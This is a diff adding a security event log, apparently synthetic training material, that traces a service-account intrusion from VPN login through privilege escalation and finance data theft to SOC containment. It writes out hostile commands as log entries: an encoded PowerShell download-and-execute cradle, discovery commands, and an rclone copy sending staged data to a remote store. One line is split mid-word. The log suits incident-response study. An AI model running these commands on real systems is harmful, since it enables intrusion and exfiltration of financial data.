@@ -1,0 +1,46 @@
+2026-05-14T12:28:44Z vpn.auth.failure user=svc-build source_ip=185.220.101.44 geo=NL device=vpn-gw-01 message="VPN login failed: invalid password"
+2026-05-14T12:29:02Z vpn.auth.failure user=svc-build source_ip=185.220.101.44 geo=NL device=vpn-gw-01 message="VPN login failed: invalid password"
+2026-05-14T12:29:18Z vpn.auth.failure user=svc-bu
+ild source_ip=185.220.101.44 geo=NL device=vpn-gw-01 message="VPN login failed: invalid password"
+2026-05-14T12:29:43Z vpn.auth.failure user=svc-build source_ip=185.220.101.44 geo=NL device=vpn-gw-01 message="VPN login failed: invalid password"
+2026-05-14T12:30:11Z vpn.auth.failure user=svc-build source_ip=185.220.101.44 geo=NL device=vpn-gw-01 message="VPN login failed: invalid password"
+2026-05-14T12:30:55Z vpn.auth.success user=svc-build source_ip=185.220.101.44 geo=NL device=vpn-gw-01 mfa_result=push_approved message="VPN login successful after repeated failures"
+
+2026-05-14T12:31:12Z ad.auth.success user=svc-build source_ip=10.14.8.22 host=DC-02 logon_type=remote_interactive message="Domain authentication succeeded"
+2026-05-14T12:32:09Z ad.directory.read user=svc-build host=DC-02 target=OU=Servers message="Account enumerated server objects"
+2026-05-14T12:33:31Z ad.group.enumeration user=svc-build host=DC-02 target="Domain Admins" message="Account queried privileged group membership"
+2026-05-14T12:34:17Z ad.group.enumeration user=svc-build host=DC-02 target="Backup Operators" message="Account queried privileged group membership"
+2026-05-14T12:35:48Z ad.privilege_change user=svc-build actor=svc-build target="Backup Operators" action=add_member message="svc-build added itself to Backup Operators"
+2026-05-14T12:36:02Z ad.policy.change user=svc-build host=DC-02 target="Default Domain Controllers Policy" message="Audit policy modified: process creation logging disabled"
+
+2026-05-14T12:38:21Z endpoint.process.start host=BUILD-07 user=svc-build process=powershell.exe parent=explorer.exe command="powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA" severity=high message="Encoded PowerShell launched"
+2026-05-14T12:38:44Z endpoint.network.connect host=BUILD-07 user=svc-build process=powershell.exe destination_ip=45.83.66.12 destination_port=443 message="PowerShell connected to external IP"
+2026-05-14T12:39:03Z endpoint.file.write host=BUILD-07 user=svc-build path="C:\\ProgramData\\win_update.ps1" hash=9c1b8b9e message="PowerShell script written to ProgramData"
+2026-05-14T12:39:40Z endpoint.process.start host=BUILD-07 user=svc-build process=cmd.exe parent=powershell.exe command="cmd /c whoami /groups" message="Privilege discovery command executed"
+2026-05-14T12:40:16Z endpoint.process.start host=BUILD-07 user=svc-build process=nltest.exe parent=cmd.exe command="nltest /dclist:corp.local" message="Domain controller discovery executed"
+
+2026-05-14T12:42:27Z smb.auth.success user=svc-build source_host=BUILD-07 target_host=FS-01 share=finance$ message="SMB session established to restricted finance share"
+2026-05-14T12:42:58Z file.access.denied user=svc-build host=FS-01 path="\\\\FS-01\\finance$\\payroll\\2026_q2.xlsx" message="Access denied to payroll spreadsheet"
+2026-05-14T12:43:11Z file.access.success user=svc-build host=FS-01 path="\\\\FS-01\\finance$\\audit\\vendor_payments.csv" bytes_read=481204 message="Sensitive finance CSV read"
+2026-05-14T12:43:28Z file.access.success user=svc-build host=FS-01 path="\\\\FS-01\\finance$\\audit\\bank_accounts.csv" bytes_read=238901 message="Sensitive bank account CSV read"
+2026-05-14T12:44:01Z file.archive.create user=svc-build host=FS-01 process=7z.exe path="C:\\Windows\\Temp\\finance_audit_bundle.7z" size_mb=42 message="Archive created from finance audit folder"
+
+2026-05-14T12:45:22Z database.login.success user=svc-build source_host=BUILD-07 db_host=DB-03 database=payments message="Database login succeeded from unusual workstation"
+2026-05-14T12:46:04Z database.query user=svc-build db_host=DB-03 database=payments rows_returned=2487 message="SELECT customer_id, routing_number, account_number FROM vendor_bank_accounts"
+2026-05-14T12:46:51Z database.export user=svc-build db_host=DB-03 output="C:\\Windows\\Temp\\vendor_bank_accounts.csv" rows_exported=2487 message="Query results exported to CSV"
+
+2026-05-14T12:48:19Z endpoint.process.start host=BUILD-07 user=svc-build process=rclone.exe parent=cmd.exe command="rclone copy C:\\Windows\\Temp remote:corp-backup --config C:\\ProgramData\\rclone.conf" severity=critical message="Rclone launched with local config"
+2026-05-14T12:48:34Z endpoint.network.connect host=BUILD-07 user=svc-build process=rclone.exe destination_ip=162.159.135.42 destination_port=443 bytes_sent=9384211 message="Large outbound transfer initiated"
+2026-05-14T12:49:12Z proxy.upload host=BUILD-07 user=svc-build destination_domain=files.example-storage.net bytes_out=48392011 category=cloud_storage message="Unusual upload volume to cloud storage"
+2026-05-14T12:50:03Z dlp.alert user=svc-build host=BUILD-07 policy="Financial Data Egress" severity=critical message="Possible bank account numbers observed in outbound TLS session metadata"
+
+2026-05-14T12:51:40Z edr.alert host=BUILD-07 severity=high technique=T1059.001 tactic=Execution message="Suspicious encoded PowerShell and rclone activity detected"
+2026-05-14T12:52:18Z edr.alert host=BUILD-07 severity=high technique=T1021.002 tactic=Lateral_Movement message="Suspicious SMB access to finance file server"
+2026-05-14T12:53:02Z soc.note analyst=a.khan incident=INC-2026-014 message="svc-build is normally used only by CI pipeline from BUILD-03, not VPN or interactive login"
+2026-05-14T12:53:44Z soc.action analyst=a.khan incident=INC-2026-014 action=disable_account target=svc-build message="Account disabled pending owner validation"
+2026-05-14T12:54:08Z soc.action analyst=a.khan incident=INC-2026-014 action=isolate_host target=BUILD-07 message="Endpoint isolated from network via EDR"
+2026-05-14T12:54:55Z soc.note analyst=a.khan incident=INC-2026-014 message="Priority recommendations: preserve VPN, AD, EDR, proxy, DLP, database, and file server logs; rotate svc-build secrets; review Backup Operators membership changes; confirm whether outbound transfer completed"
+
+2026-05-14T13:02:33Z ad.audit user=domain-admin host=DC-02 action=remove_member target="Backup Operators" member=svc-build message="svc-build removed from Backup Operators"
+2026-05-14T13:05:41Z secrets.rotation system=vault target=svc-build status=completed message="CI service account secret rotated"
+2026-05-14T13:12:09Z firewall.block source_host=BUILD-07 destination_ip=162.159.135.42 destination_port=443 action=blocked message="Outbound cloud storage destination blocked"
